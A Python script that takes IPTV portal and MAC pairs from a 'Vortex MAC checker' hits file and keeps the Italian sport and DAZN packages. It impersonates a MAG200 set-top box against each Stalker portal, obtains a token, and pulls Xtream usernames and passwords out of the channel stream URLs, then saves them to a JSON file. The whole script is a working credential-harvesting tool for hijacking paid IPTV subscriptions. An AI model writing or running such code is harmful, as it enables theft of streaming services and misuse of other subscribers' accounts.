import requests, json, re, time

with open(r'C:\Users\alecl\Downloads\Telegram Desktop\Vortex_MAC_hits_2026-08-19.txt', 'r', encoding='utf-8', errors='ignore') as f:
    content = f.read()

hits = content.split('VORTEX MAC CHECKER HIT')
macs_to_process = set()
for hit in hits:
    if any(x in hit for x in ('IT | PLUTO', 'EU | IT | SPORT', 'EU | IT | DAZN', 'EU | IT | BAMBINI', 'EU | IT | DOCUMENTARIO')):
        portal_match = re.search(r'PORTAL\s*:\s*(http[^\n]+)', hit)
        mac_match = re.search(r'MAC\s*:\s*([0-9a-fA-F:]+)', hit)
        if portal_match and mac_match:
            macs_to_process.add((portal_match.group(1).strip(), mac_match.group(1).strip()))

valid_creds = []
ua = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3'

print(f'Found {len(macs_to_process)} macs to process')

for portal, mac in macs_to_process:
    try:
        url = f'{portal}/server/load.php'
        cookies = {'mac': mac}
        headers = {'User-Agent': ua}
        
        res = requests.get(f'{url}?type=stb&action=handshake&token=&dvIfaceMac={mac}', cookies=cookies, headers=headers, timeout=5)
        if res.status_code != 200: continue
        token = res.json().get('js', {}).get('token')
        if not token: continue
        headers['Authorization'] = f'Bearer {token}'
        
        res = requests.get(f'{url}?type=itv&action=get_all_channels&mac={mac}', cookies=cookies, headers=headers, timeout=5)
        if res.status_code != 200: continue
        data = res.json()
        if 'js' in data and 'data' in data['js'] and len(data['js']['data']) > 0:
            cmd = data['js']['data'][0].get('cmd', '')
            m = re.search(r'http[s]?://[^/]+/([^/]+)/([^/]+)/\d+', cmd)
            if m:
                user = m.group(1)
                pwd = m.group(2)
                valid_creds.append({'host': portal, 'user': user, 'pass': pwd, 'mac': mac})
                print(f'Success for {mac}: {user}:{pwd}')
            else:
                print(f'Failed parsing cmd for {mac}: {cmd}')
    except Exception as e:
        print('Error for', mac, e)
        
print(f'Got {len(valid_creds)} valid Xtream credentials.')
with open('extracted_creds.json', 'w') as f:
    json.dump(valid_creds, f)
